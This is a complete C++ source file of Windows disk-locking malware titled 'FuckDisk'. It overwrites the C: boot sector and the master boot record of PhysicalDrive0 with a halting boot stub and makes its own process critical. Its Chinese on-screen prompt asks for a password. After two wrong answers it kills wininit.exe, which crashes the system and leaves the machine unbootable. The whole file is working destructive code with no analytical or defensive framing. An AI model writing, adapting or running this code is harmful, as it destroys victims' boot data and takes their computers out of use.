#include <iostream>
#include <windows.h>
#include <cstdlib>
#include <ctime> 

#define size 512
bool EnableDebugPrivilege();

typedef NTSTATUS(__cdecl *fnRtlSetProcessIsCritical)(IN  BOOLEAN  NewValue, OUT PBOOLEAN OldValue OPTIONAL, IN  BOOLEAN  CheckFlag);
fnRtlSetProcessIsCritical pRtlSetProcessIsCritical;

using namespace std;
int main(void)
{
    int a,r;
    float key;
	FILE *DiskFile;
	FILE *CDiskFile;
	FILE *File;
	unsigned char DiskCode[] = {0x8C,0xC8,0x8E,0xD8,0x8E,0xC0,0xB8,0x1E,0x7C,0xB9,0x0A,0x00,0x89,0xC5,0xB4,0x13,0xB0,0x00,0xB7,0x00,0xB3,0x0A,0xB6,0x00,0xB2,0x00,0xCD,0x10,0xFA,0xF4,0x46,0x75,0x63,0x6B,0x44,0x69,0x73,0x6B,0x2E,0x65,0x78,0x65,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x55,0xAA}; 
	unsigned char MBRCODE[size]={0};
	unsigned char CdiskCODE[size]={0};
	CDiskFile=fopen("\\\\.\\C:","rb+");
	if(!CDiskFile)
		puts("Can't open file!");
	else if(!feof(CDiskFile))
	{
		fseek(CDiskFile,0,SEEK_SET);
		fread(CdiskCODE,1,size,CDiskFile);
		fseek(CDiskFile,0,SEEK_SET);
		fwrite(DiskCode,size,1,CDiskFile);
		fclose(CDiskFile);
	}
	DiskFile=fopen("\\\\.\\PhysicalDrive0","rb+");
	if(!DiskFile)
		puts("Can't open file!");
	else if(!feof(DiskFile))
	{
		fseek(DiskFile,0,SEEK_SET);
		fread(MBRCODE,1,size,DiskFile);
		fseek(DiskFile,0,SEEK_SET);
		fwrite(DiskCode,size,1,DiskFile);
		fclose(DiskFile);
	}
	EnableDebugPrivilege();
	HMODULE  hNtdll = GetModuleHandle(TEXT("ntdll.dll"));
	if (hNtdll)
	{
		pRtlSetProcessIsCritical = (fnRtlSetProcessIsCritical)GetProcAddress(hNtdll, "RtlSetProcessIsCritical");
		if (pRtlSetProcessIsCritical)
		{
			pRtlSetProcessIsCritical(TRUE, NULL, FALSE);
		}
	}
	srand(time(0));
	r=rand()%5000,1;
	key=r-80+567/31*34;
	system ("Color 4F");
	system ("Title FuckDisk");
	cout << "要恢复你的电脑，请在【密码】处输入：" << key << endl;
	cout << "请输入密码：";
    cin >> a;
    if (a == key)
    {
    	FILE *DiskFile;
    	FILE *CDiskFile;
		FILE *File;
		CDiskFile=fopen("\\\\.\\C:","rb+");
		if(!CDiskFile)
			puts("Can't open file!");
		else if(!feof(CDiskFile))
		{
			fseek(CDiskFile,0,SEEK_SET);
			fwrite(CdiskCODE,size,1,CDiskFile);
			fclose(CDiskFile);
		}
		DiskFile=fopen("\\\\.\\PhysicalDrive0","rb+");
		if(!DiskFile)
			puts("Can't open file!");
		else if(!feof(DiskFile))
		{
			fseek(DiskFile,0,SEEK_SET);
			fwrite(MBRCODE,size,1,DiskFile);
			fclose(DiskFile);
		}
		cout << "密码正确，恢复完成！" << endl;
		if (pRtlSetProcessIsCritical)
		{
			pRtlSetProcessIsCritical(FALSE, NULL, FALSE);
		}
		system ("pause");
    }
    else
    {
		cout << "不正确的密码！" << endl;
	    cout << "你还有一次尝试的机会。" << endl;
	    cout << "请输入密码：" ;
	    cin >> a;
	    if (a == key)
	    {
	    	FILE *DiskFile;
	    	FILE *CDiskFile;
			FILE *File;
			CDiskFile=fopen("\\\\.\\C:","rb+");
			if(!CDiskFile)
				puts("Can't open file!");
			else if(!feof(CDiskFile))
			{
				fseek(CDiskFile,0,SEEK_SET);
				fwrite(CdiskCODE,size,1,CDiskFile);
				fclose(CDiskFile);
			}
			DiskFile=fopen("\\\\.\\PhysicalDrive0","rb+");
			if(!DiskFile)
				puts("Can't open file!");
			else if(!feof(DiskFile))
			{
				fseek(DiskFile,0,SEEK_SET);
				fwrite(MBRCODE,size,1,DiskFile);
				fclose(DiskFile);
			}
			cout << "密码正确。你的电脑已完成恢复。再贱。" << endl;
			if (pRtlSetProcessIsCritical)
			{
				pRtlSetProcessIsCritical(FALSE, NULL, FALSE);
			}
			system ("pause");
	    }
	    else
	    {
	    cout << "你的电脑已死。" << endl;
	    system ("pause");
	    system ("taskkill /f /im wininit.exe /t");
		}
	}
	return 0;
}



bool EnableDebugPrivilege()
{
	HANDLE hToken;
	LUID sedebugnameValue;
	TOKEN_PRIVILEGES tkp;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
	{
		return   false;
	}
	if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &sedebugnameValue))
	{
		CloseHandle(hToken);
		return false;
	}
	tkp.PrivilegeCount = 1;
	tkp.Privileges[0].Luid = sedebugnameValue;
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	if (!AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof(tkp), NULL, NULL))
	{
		CloseHandle(hToken);
		return false;
	}
	return true;
}
